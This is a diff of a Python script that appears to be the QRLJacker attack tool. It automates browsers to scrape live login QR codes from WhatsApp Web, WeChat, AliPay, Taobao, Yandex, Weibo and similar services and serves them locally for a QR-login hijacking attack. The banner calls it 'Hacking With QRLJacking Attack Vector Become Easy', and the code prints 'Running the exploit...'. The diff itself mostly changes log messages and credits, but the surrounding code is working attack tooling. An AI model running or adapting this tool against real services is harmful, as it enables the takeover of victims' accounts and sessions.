@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #-*- encoding:utf-8 -*-
-#Author:D4Vinci
+#Author: @D4Vinci
 import base64 ,time ,os ,urllib ,sys ,threading ,configparser
 from binascii import a2b_base64
 
@@ -16,12 +16,12 @@ try:
 	from selenium import webdriver
 
 except:
-	print "[!] Error Importing Exterinal Libraries"
-	print "[!] Trying install it using the requirements.txt file..\n"
+	print "[*] Error Importing Exterinal Libraries"
+	print "[*] Trying install it using the requirements.txt file..\n"
 	try:
 		os.system("pip install -r requirements.txt")
 	except:
-		print "[!] Failed installing it [ Install it yourself :p ]"
+		print "[*] Failed installing the requirements [ Install it yourself :p ]"
 		exit(0)
 
 finally:
@@ -34,40 +34,40 @@ settings = configparser.ConfigParser()
 def Serve_it(port=1337):
 	def serve(port):
 		if os.name=="nt":
-			print " [!] Serving files on "+str(port)+" port"
+			print " [*] Serving files on http://localhost:"+str(port)
 			os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
 		else:
-			print " [!] Serving files on "+str(port)+" port"
+			print " [*] Serving files on http://localhost:"+str(port)
 			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
 	threading.Thread(target=serve,args=(port,)).start()
 
 def create_driver():
 	try:
 		web = webdriver.Firefox()
-		print " [+]Opening Mozila FireFox..."
+		print " [*] Opening Mozila FireFox..."
 		return web
 	except:
 		try:
 			web = webdriver.Chrome()
-			print " [+]Opening Google Chrome..."
+			print " [*] We got some errors running Firefox, Opening Google Chrome instead..."
 			return web
 		except:
 			try:
 				web = webdriver.Opera()
-				print " [+]Opening Opera..."
+				print " [*] We got some errors running Chrome, Opening Opera instead..."
 				return web
 			except:
 				try:
 					web = webdriver.Edge()
-					print " [+]Opening Edge..."
+					print " [*] We got some errors running Opera, Opening Edge instead..."
 					return web
 				except:
 					try:
 						web = webdriver.Ie()
-						print " [+]Opening Internet Explorer..."
+						print " [*] We got some errors running Edge, Opening Internet Explorer instead..."
 						return web
 					except:
-						print " Error : \n Can not call webbrowsers\n  Check your pc"
+						print " Error: \n Can not call any WebBrowsers\n  Check your Installed Browsers!"
 						exit(0)
 
 #Stolen from stackoverflow :D
@@ -85,7 +85,7 @@ def Screenshot(PicName ,location ,size):
 def whatsapp():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get('https://web.whatsapp.com/')
 	time.sleep(5)
 
@@ -93,7 +93,7 @@ def whatsapp():
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			button = driver.find_element_by_class_name('qr-button')
-			print " [!]Clicking to reload QR code image..."
+			print " [*] Idle detected, Reloading QR code image (Good job WhatsApp)..."
 			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
@@ -102,12 +102,12 @@ def whatsapp():
 		try:
 			img = driver.find_elements_by_tag_name('img')[0]
 			src = img.get_attribute('src').replace("data:image/png;base64,","")
-			print " [+]The QR code image found !"
-			print " [+]Downloading the image.."
+			print " [*] The QR code image found !"
+			print " [*] Downloading the image..."
 			binary_data = a2b_base64(src)
 			qr = open("tmp.png","wb")
 			qr.write(binary_data)
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			qr.close()
 			time.sleep(5)
 			continue
@@ -119,20 +119,20 @@ def Yandex():
 	print "\n-- --- -- --- -- --- -- --- -- --- --"
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://passport.yandex.com/auth?mode=qr")
 	time.sleep(5)
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			data = urllib.urlopen(img_url).read()
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			f = open("tmp.svg","w").write(data)
-			print " [#]Saved To tmp.svg"
+			print " [*] Saved To tmp.svg"
 			time.sleep(10)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -141,7 +141,7 @@ def Yandex():
 def Airdroid():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("http://web.airdroid.com")
 	time.sleep(5)
 	img_number = 16
@@ -150,7 +150,7 @@ def Airdroid():
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
-			print " [!]Clicking to reload QR code image..."
+			print " [*] Clicking to reload QR code image..."
 			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
@@ -158,14 +158,14 @@ def Airdroid():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[img_number]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(10)
 			if refresh == 0:
-				print " [!]Refreshing page..."
+				print " [*] Refreshing page..."
 				driver.refresh()
 				refresh = 1
 			img_number = 15
@@ -176,7 +176,7 @@ def Airdroid():
 def Weibo():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("http://weibo.com/login.php")
 	time.sleep(5)
 	while True:
@@ -184,13 +184,13 @@ def Weibo():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[len(imgs)-1]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(10)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -199,7 +199,7 @@ def Weibo():
 def WeChat():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://web.wechat.com")
 	time.sleep(5)
 	while True:
@@ -207,11 +207,11 @@ def WeChat():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(10)
 			continue
 		except:
@@ -220,7 +220,7 @@ def WeChat():
 def AliPay():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://auth.alipay.com/login/index.htm")
 	time.sleep(10)
 	while True:
@@ -228,7 +228,7 @@ def AliPay():
 		try:
 			c = driver.find_element_by_class_name('ui-nav')[0]
 			t = c.find_elements_by_tag_name("li")[0]
-			print " [!]Clicking to show QR code image..."
+			print " [*] Clicking to show QR code image..."
 			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
@@ -237,15 +237,15 @@ def AliPay():
 		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
 			img = driver.find_elements_by_tag_name("canvas")[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			location = img.location
 			size = img.size
-			print " [+]Grabbing photo.."
+			print " [*] Grabbing photo.."
 			Screenshot("tmp.png" ,location ,size)
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			webdriver.delete_all_cookies()
 			time.sleep(10)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -254,7 +254,7 @@ def AliPay():
 def Taobao():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://login.taobao.com")
 	time.sleep(5)
 	while True:
@@ -262,7 +262,7 @@ def Taobao():
 		try:
 			button_class = web.find_element_by_class_name("msg-err")
 			button = button_class.find_elements_by_tag_name("a")[0]
-			print " [!]Clicking to reload QR code image..."
+			print " [*] Clicking to reload QR code image..."
 			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
 			time.sleep(5)
 		except:
@@ -270,11 +270,11 @@ def Taobao():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(10)
 			continue
 		except:
@@ -283,7 +283,7 @@ def Taobao():
 def mydigipass():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
 	time.sleep(5)
 	while True:
@@ -291,13 +291,13 @@ def mydigipass():
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[1]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(20)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -306,7 +306,7 @@ def mydigipass():
 def Zapper():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://www.zapper.com/login.php")
 	time.sleep(5)
 	while True:
@@ -314,11 +314,11 @@ def Zapper():
 		try:
 			c = web.find_elements_by_id("qrcodecontainer2")
 			img = c[0].find_elements_by_tag_name("img")[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(15)
 			continue
 		except:
@@ -330,7 +330,7 @@ def Zapper():
 def Trustly_App():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://trustlyapp.com/backend")
 	time.sleep(5)
 	while True:
@@ -338,11 +338,11 @@ def Trustly_App():
 		try:
 			c = web.find_elements_by_class_name("qrcode-tab")[0]
 			img = c.find_elements_by_tag_name("img")[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(60)
 			continue
 		except:
@@ -351,18 +351,18 @@ def Trustly_App():
 def Yelophone():
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get("https://www.yelophone.com/app#/login")
 	time.sleep(5)
 	while True:
 		print "-- --- -- --- -- --- -- --- -- --- --"
 		try:
 			c = web.find_elements_by_id("qrcode")[0]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = c.get_attribute("src")
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = open("tmp.png","wb").write( requests.get( c.get_attribute("src") ).content )
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(60)
 			continue
 		except:
@@ -441,7 +441,7 @@ def Add_website():
 			int(port)
 		except ValueError:
 			port = 1337
-		print " [+] Saving settings..."
+		print " [*] Saving settings..."
 		settings.read("Data/Custom.ini")
 		name = url.replace("http://","").replace("https://","").split("/")[0]
 		settings.add_section(name)
@@ -452,8 +452,8 @@ def Add_website():
 		settings.set(name,"Seconds",str(Seconds))
 		settings.write(open("Data/Custom.ini","wb"))
 		clear()
-		print " [+] Settings saved."
-		print " [+] Running the exploit..."
+		print " [*] Settings saved."
+		print " [*] Running the exploit..."
 		print "="*12
 		make( name , port )
 		Serve_it(port)
@@ -473,7 +473,7 @@ def Add_website():
 			int( port )
 		except ValueError:
 			port = 1337
-		print " [+] Saving settings..."
+		print " [*] Saving settings..."
 		settings.read("Data/Custom.ini")
 		name = url.replace("http://","").replace("https://","").split("/")[0]
 		settings.add_section(name)
@@ -483,8 +483,8 @@ def Add_website():
 		settings.set(name,"Seconds",str(Seconds))
 		settings.write(open("Data/Custom.ini","wb"))
 		clear()
-		print " [+] Settings saved."
-		print " [+] Running the exploit..."
+		print " [*] Settings saved."
+		print " [*] Running the exploit..."
 		print "="*12
 		make( name , port )
 		Serve_it( port )
@@ -504,7 +504,7 @@ def Add_website():
 			int( port )
 		except ValueError:
 			port = 1337
-		print " [+] Saving settings..."
+		print " [*] Saving settings..."
 		settings.read("Data/Custom.ini")
 		name = url.replace("http://","").replace("https://","").split("/")[0]
 		settings.add_section(name)
@@ -514,8 +514,8 @@ def Add_website():
 		settings.set(name,"Seconds",str(Seconds))
 		settings.write(open("Data/Custom.ini","wb"))
 		clear()
-		print " [+] Settings saved."
-		print " [+] Running the exploit..."
+		print " [*] Settings saved."
+		print " [*] Running the exploit..."
 		print "="*12
 		make( name , port )
 		Serve_it( port )
@@ -582,14 +582,14 @@ def Remove_website():
 	except:
 		Remove_website()
 	settings.remove_section(section)
-	print " [!] Website removed."
+	print " [*] Website removed."
 	time.sleep(5)
 	main()
 
 def First_Method(classname,url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get(url)
 
 	while True:
@@ -597,13 +597,13 @@ def First_Method(classname,url,image_number,s=10):
 		try:
 			login = driver.find_element_by_class_name(classname)
 			img = login.find_elements_by_tag_name('img')[int(image_number)]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(s)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -612,7 +612,7 @@ def First_Method(classname,url,image_number,s=10):
 def Second_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get(url)
 	time.sleep(5)
 	while True:
@@ -620,13 +620,13 @@ def Second_Method(url,image_number,s=10):
 		try:
 			imgs = driver.find_elements_by_tag_name('img')
 			img = imgs[int(image_number)]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			src = img.get_attribute('src')
-			print " [+]Downloading the image.."
+			print " [*] Downloading the image.."
 			qr = urllib.urlretrieve(src, "tmp.png")
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(s)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -635,7 +635,7 @@ def Second_Method(url,image_number,s=10):
 def Third_Method(url,image_number,s=10):
 	driver = create_driver()
 	time.sleep(5)
-	print " [+]Navigating To Website.."
+	print " [*] Navigating To Website.."
 	driver.get(url)
 	time.sleep(10)
 	while True:
@@ -643,14 +643,14 @@ def Third_Method(url,image_number,s=10):
 		try:
 			driver.save_screenshot('tmp.png') #screenshot entire page
 			img = driver.find_elements_by_tag_name("img")[int(image_number)]
-			print " [+]The QR code image found !"
+			print " [*] The QR code image found !"
 			location = img.location
 			size = img.size
-			print " [+]Grabbing photo.."
+			print " [*] Grabbing photo.."
 			Screenshot("tmp.png" ,location ,size)
-			print " [#]Saved To tmp.png"
+			print " [*] Saved To tmp.png"
 			time.sleep(s)
-			print " [!]Refreshing page..."
+			print " [*] Refreshing page..."
 			driver.refresh()
 			continue
 		except:
@@ -665,8 +665,9 @@ def main():
 | |_| |  _ <| |___| |_| | (_| | (__|   |  __| |
  \__\_|_| \_|_____|\___/ \__,_|\___|_|\_\___|_|
 
-# Hacking With Qrljacking Attack Vector Become Easy
-# Coded By karim Shoair | D4Vinci
+#Hacking With QRLJacking Attack Vector Become Easy
+#Attack Author: Mohamed A. Baset | @SymbianSyMoh
+#Coded By: Karim Shoair | @D4Vinci
 
  Vulnerable Web Applications and Services:
   1.Chat Applications
@@ -687,7 +688,6 @@ def main():
 	#Chat Applications
 
 	if choice == 9:
-		print "=====Goodbye====="
 		time.sleep(1.5)
 		exit(0)
 
